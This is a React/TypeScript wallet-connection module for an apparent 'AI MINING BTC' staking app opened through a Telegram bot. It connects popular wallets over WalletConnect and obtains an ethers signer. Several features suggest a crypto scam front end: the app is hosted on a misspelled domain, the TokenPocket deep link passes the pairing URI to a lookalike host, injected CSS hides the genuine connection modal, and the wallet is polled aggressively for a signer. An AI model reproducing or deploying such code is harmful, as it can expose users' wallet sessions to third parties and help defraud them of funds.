import React, { createContext, useContext, useState, useEffect, useCallback } from 'react';


import { createAppKit, useAppKitProvider, useAppKitAccount, useAppKit, useDisconnect } from '@reown/appkit/react';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { bsc } from '@reown/appkit/networks';
import { BrowserProvider, JsonRpcSigner } from 'ethers';

// 1. Get ProjectId
const projectId = 'ec457184730a7f1e24bbe58a393f442b';

// 2. Set networks
const networks: [any, ...any[]] = [bsc];

// 3. Create a metadata object
const metadata = {
  name: 'AI MINING BTC',
  description: 'Secure AI-powered Bitcoin Staking Platform.',
  url: 'https://riotnode.riotplatfroms.workers.dev/',
  icons: ['https://riotnode.riotplatfroms.workers.dev/logo.png'],
  redirect: {
    native: 'https://t.me/aiminingbtc_bot',
    universal: 'https://t.me/aiminingbtc_bot'
  }
};

// 4. Create AppKit
createAppKit({
  adapters: [new EthersAdapter()],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true
  },
  featuredWalletIds: [
    'c56bbc40a89474a2d85830541457197b', // MetaMask
    '4622a2b2d6ad1323bca51c019187f621', // Trust
    '762c1d97118241a457494441af10665b', // SafePal
    'd681b9730e0e35fd2aeb053416ca9797', // TokenPocket
    '8a0ee10452995142101c030d7042502c', // Binance
    '971e689d0ad3b533db5817bc2d449622'  // OKX
  ],
  allWallets: 'SHOW',
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#FFD700',
    '--w3m-border-radius-master': '16px'
  }
});

interface WalletContextType {
    address: string | undefined;
    isConnected: boolean;
    signer: JsonRpcSigner | null;
    connect: () => Promise<void>;
    disconnect: () => Promise<void>;
    isConnecting: boolean;
    walletType: string | null;
    walletProvider: any;
    forceSync: () => Promise<void>;
    hardReset: () => void;
}

const WalletContext = createContext<WalletContextType | undefined>(undefined);

export const useWallet = () => {
    const context = useContext(WalletContext);
    if (!context) throw new Error('useWallet must be used within a WalletProvider');
    return context;
};

export function WalletProvider({ children }: { children: React.ReactNode }) {
    const { address, isConnected } = useAppKitAccount();
    const { walletProvider } = useAppKitProvider('eip155');
    const { open } = useAppKit();
    const { disconnect: walletDisconnect } = useDisconnect();
    
    const [signer, setSigner] = useState<JsonRpcSigner | null>(null);
    const [isConnecting, setIsConnecting] = useState(false);
    const [walletName, setWalletName] = useState<string | null>(() => localStorage.getItem('aimining_last_wallet'));
    const [handshakeUri, setHandshakeUri] = useState<string | null>(null);
    const [isPulsing, setIsPulsing] = useState(false);
    const [showSelectionHub, setShowSelectionHub] = useState(false);
    const [pendingSelection, setPendingSelection] = useState<string | null>(null);

    // 1. Handshake Capture and Synchronization Heartbeat
    useEffect(() => {
        if (!walletProvider) return;
        const provider = walletProvider as any;
        
        if (provider && typeof provider.on === 'function') {
            provider.on("display_uri", (uri: string) => {
                console.log("[Bridge] New Handshake Generated");
                setHandshakeUri(uri);
            });
        }
    }, [walletProvider]);

    const syncSigner = useCallback(async (isManual = false) => {
        if (walletProvider) {
            try {
                const provider = walletProvider as any;
                // Aggressive Probe: Pulse the provider to wake up the session
                const accounts = await provider.request({ method: 'eth_accounts' });
                
                if (accounts && accounts.length > 0) {
                    const browserProvider = new BrowserProvider(provider);
                    const web3Signer = await browserProvider.getSigner();
                    setSigner(web3Signer);

                    const peer = provider?.session?.peer;
                    const name = peer?.metadata?.name?.toLowerCase() || '';
                    let detected: string | null = null;
                    if (name.includes('metamask')) detected = 'metamask';
                    else if (name.includes('trust')) detected = 'trust';
                    else if (name.includes('safepal')) detected = 'safepal';
                    else if (name.includes('tokenpocket')) detected = 'tp';
                    
                    if (detected) {
                        setWalletName(detected);
                        localStorage.setItem('aimining_last_wallet', detected);
                    }
                    if (isManual) console.log("[Sync] Heartbeat confirmed account:", accounts[0]);

                    setHandshakeUri(null);
                    setIsConnecting(false);
                    return true;
                }
            } catch (err) {
                if (isManual) console.warn("[Sync] Probe failed:", err);
            }
        }
        return false;
    }, [walletProvider]);

    // FOCUS HEARTBEAT: Instant sync on app return
    useEffect(() => {
        const handleSync = () => {
            console.log("[Sync] App Focus/Visibility pulse triggered");
            syncSigner(true);
        };
        
        window.addEventListener('focus', handleSync);
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'visible') handleSync();
        });
        window.addEventListener('pageshow', handleSync);

        return () => {
            window.removeEventListener('focus', handleSync);
            document.removeEventListener('visibilitychange', handleSync);
            window.removeEventListener('pageshow', handleSync);
        };
    }, [syncSigner]);

    useEffect(() => {
        syncSigner();
    }, [syncSigner, address]);

    const forceSync = async () => {
        setIsPulsing(true);
        const success = await syncSigner(true);
        setTimeout(() => setIsPulsing(false), 2000);
        if (success) {
            setHandshakeUri(null);
            setShowSelectionHub(false);
            setIsConnecting(false);
        }
    };

    // AUTO-LAUNCHER: When a selection is made and URI arrives, FIRE it immediately
    useEffect(() => {
        if (pendingSelection && handshakeUri) {
            console.log(`[Hub] Auto-launching (Universal): ${pendingSelection}`);
            const encodedUri = encodeURIComponent(handshakeUri);
            
            const schemes: Record<string, string> = {
                'metamask': `https://metamask.app.link/wc?uri=${encodedUri}`,
                'trust': `https://link.trustwallet.com/wc?uri=${encodedUri}`,
                'binance': `https://www.binance.com/en/download?uri=${encodedUri}`,
                'safepal': `https://link.safepal.io/wc?uri=${encodedUri}`,
                'tp': `https://tokenpocket.platfrom.com/wc?uri=${encodedUri}`,
                'okx': `https://www.okx.com/download?uri=${encodedUri}`
            };

            const tg = (window as any).Telegram?.WebApp;
            if (tg && tg.openLink) {
                tg.openLink(schemes[pendingSelection] || schemes.metamask, { try_instant_view: false });
            }
            
            // Keep pendingSelection for UI status but clear handshake once fired
            setHandshakeUri(null);
        }
    }, [pendingSelection, handshakeUri]);

    // AGGRESSIVE HEARTBEAT: Pulse every 800ms when bridge is active
    useEffect(() => {
        if (!handshakeUri && !showSelectionHub) return;
        const pulseInterval = setInterval(() => {
            syncSigner(true);
        }, 800);
        return () => clearInterval(pulseInterval);
    }, [handshakeUri, showSelectionHub, syncSigner]);

    const hardReset = () => {
        localStorage.clear();
        sessionStorage.clear();
        setHandshakeUri(null);
        setSigner(null);
        walletDisconnect().catch(() => {});
        window.location.reload();
    };

    const connect = async () => {
        if (isConnected) {
             await open(); 
             return;
        }
        setShowSelectionHub(true);
    };

    const handleHubSelect = async (walletKey: string) => {
        setPendingSelection(walletKey);
        setIsPulsing(true);
        
        try {
            console.log(`[Hub] Initiating Headless Handshake for: ${walletKey}`);
            
            // USE APP-KIT CORE: But suppress the UI completely
            const style = document.createElement('style');
            style.id = 'reown-suppressor';
            style.innerHTML = `
                w3m-modal, w3m-overlay, [class*="w3m-"], .w3m-api-modal { 
                    display: none !important; 
                    visibility: hidden !important; 
                    opacity: 0 !important;
                }
            `;
            document.head.appendChild(style);

            // This triggers the display_uri event in the background
            await open({ view: 'Connect' });

            // Cleanup suppressor after handshake
            setTimeout(() => {
                const el = document.getElementById('reown-suppressor');
                if (el) el.remove();
            }, 5000);
        } catch (err) {
            console.error("[Hub] Handshake initiation failed:", err);
            setPendingSelection(null);
            setIsPulsing(false);
            const el = document.getElementById('reown-suppressor');
            if (el) el.remove();
        }
    };

    const disconnect = async () => {
        try {
            localStorage.removeItem('aimining_last_wallet');
            setWalletName(null);
            setSigner(null);
            walletDisconnect().catch(() => {});
            window.location.reload(); 
        } catch (err) {
            console.error("[Wallet] Disconnect failed:", err);
        }
    };

    return (
        <WalletContext.Provider value={{ 
            address: address || signer?.address, 
            isConnected: isConnected || !!signer, 
            signer, 
            connect, 
            disconnect, 
            isConnecting,
            walletType: walletName,
            walletProvider,
            forceSync,
            hardReset
        }}>
            {children}

            {/* GOD-MODE CONNECTION BRIDGE */}
            {/* DIRECT-CONNECT PREMIUM HUB */}
            {showSelectionHub && (
                <div className="fixed inset-0 z-[9999] bg-black/60 backdrop-blur-xl flex flex-col items-center justify-center p-6 animate-in fade-in duration-500">
                    <div className="glass-panel rounded-[40px] p-8 w-full max-w-sm shadow-2xl relative overflow-hidden neon-border">
                        <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-primary to-transparent opacity-30"></div>
                        
                        <div className="flex justify-between items-center mb-8">
                            <h2 className="text-xl font-bold text-white uppercase tracking-tighter metallic-text">Connection Hub</h2>
                            <button 
                                onClick={() => { setShowSelectionHub(false); setPendingSelection(null); }}
                                className="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center border-none cursor-pointer hover:bg-white/10 transition-colors"
                            >
                                <span className="material-icons-round text-sm text-gray-500">close</span>
                            </button>
                        </div>

                        <div className="grid grid-cols-2 gap-4 mb-8">
                            {[
                                { id: 'metamask', name: 'MetaMask', icon: 'fox', color: '#F6851B' },
                                { id: 'trust', name: 'Trust Wallet', icon: 'shield', color: '#3375BB' },
                                { id: 'binance', name: 'Binance', icon: 'grid_view', color: '#F3BA2F' },
                                { id: 'safepal', name: 'SafePal', icon: 'security', color: '#E9E9E9' },
                                { id: 'tp', name: 'TokenPocket', icon: 'account_balance_wallet', color: '#2980B9' },
                                { id: 'okx', name: 'OKX Wallet', icon: 'toll', color: '#000000' }
                            ].map(w => (
                                <button
                                    key={w.id}
                                    onClick={() => handleHubSelect(w.id)}
                                    disabled={!!pendingSelection}
                                    className={`
                                        relative group glass-card p-4 rounded-3xl flex flex-col items-center gap-3 transition-all active:scale-95 cursor-pointer border-none
                                        ${pendingSelection === w.id ? 'bg-primary/10 border-primary shadow-neon' : ''}
                                    `}
                                >
                                    <div className="w-12 h-12 rounded-2xl bg-white/5 flex items-center justify-center relative overflow-hidden group-hover:bg-white/10 transition-colors">
                                        <span className="material-icons-round text-3xl" style={{ color: w.color }}>{w.icon}</span>
                                        {pendingSelection === w.id && (
                                            <div className="absolute inset-0 bg-primary/20 animate-pulse"></div>
                                        )}
                                    </div>
                                    <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest group-hover:text-white transition-colors">{w.name}</span>
                                </button>
                            ))}
                        </div>

                        <div className="flex flex-col gap-3">
                            <button 
                                onClick={forceSync}
                                className={`w-full py-4 rounded-2xl flex items-center justify-center gap-2 border-none transition-all active:scale-95 cursor-pointer 
                                    ${isPulsing ? 'btn-premium' : 'bg-white/5 text-gray-400 font-black uppercase text-[10px] tracking-widest'}`}
                            >
                                <span className={`material-icons-round text-sm ${isPulsing ? 'animate-spin' : ''}`}>sync</span>
                                {isPulsing ? 'Syncing Session...' : 'I HAVE CONNECTED IN WALLET'}
                            </button>
                            <p className="text-[8px] text-gray-600 font-bold uppercase tracking-[4px] text-center mt-2">Protocol V2.5 • RiotNode Alpha</p>
                        </div>
                    </div>
                </div>
            )}

            {/* HANDSHAKE OVERLAY (Hidden until URI generated) */}
            {handshakeUri && !showSelectionHub && (
                 <div className="fixed bottom-10 left-6 right-6 z-[10000] animate-in slide-in-from-bottom duration-500">
                    <div className="bg-primary p-4 rounded-[32px] flex items-center justify-between shadow-neon border-none relative overflow-hidden">
                        <div className="absolute inset-0 bg-white/10 animate-pulse"></div>
                        <div className="flex items-center gap-3 relative z-10">
                             <div className="w-10 h-10 bg-black/10 rounded-2xl flex items-center justify-center">
                                <span className="material-icons-round text-black animate-spin">refresh</span>
                             </div>
                             <div>
                                <p className="text-[10px] font-black text-black uppercase tracking-tight leading-none">Awaiting Approval</p>
                                <p className="text-[10px] text-black/60 font-bold uppercase tracking-widest">Connect to finish...</p>
                             </div>
                        </div>
                        <button 
                            onClick={forceSync}
                            className="bg-black text-white px-5 py-2.5 rounded-2xl text-[10px] font-black uppercase border-none cursor-pointer active:scale-95 transition-all relative z-10 shadow-lg"
                        >
                            Sync Now
                        </button>
                    </div>
                </div>
            )}
        </WalletContext.Provider>
    );
}

export function Web3Provider({ children }: { children: React.ReactNode }) {
    return <WalletProvider>{children}</WalletProvider>;
}
